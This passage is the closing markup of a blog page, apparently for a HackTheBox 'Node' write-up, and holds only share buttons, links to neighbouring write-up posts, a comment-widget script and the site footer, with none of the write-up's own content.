+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f&amp;t=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HackTheBox%20-%20Node%20WriteUp%20%7c%20Tipps%20%2b%20Anleitung&amp;url=https%3a%2f%2fwww.m10x.de%2fposts%2f2018%2f03%2fhackthebox-node-writeup-tipps--anleitung%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://www.m10x.de/posts/2018/12/hackthebox-kotarak-writeup-tipps--anleitung/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">HackTheBox - Kotarak WriteUp | Tipps &#43; Anleitung</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://www.m10x.de/posts/2018/02/hackthebox-mantis-writeup-tipps--anleitung/">
+                    <span class="button__text">HackTheBox - Mantis WriteUp | Tipps &#43; Anleitung</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+      <script defer src=https://commento-plus-plus.kirlia.de/js/commento.js></script>
+      <div id="commento"></div>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="https://www.m10x.de">m10x</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://www.m10x.de/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            <span><a href="https://www.m10x.de/datenschutz">Datenschutz</a></span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://www.m10x.de/bundle.min.205d491810c28f95aa953fae884e1c27abe13fdf93ec63b882d0036b248d4a6282eb2d134e4e7225c6ad6e86db87b08488a361ca4a7383d01fcff43f3d57b9c3.js" integrity="sha512-IF1JGBDCj5WqlT&#43;uiE4cJ6vhP9&#43;T7GO4gtADaySNSmKC6y0TTk5yJcatbobbh7CEiKNhykpzg9Afz/Q/PVe5ww=="></script>
+
+
+
+    </body>
+</html>
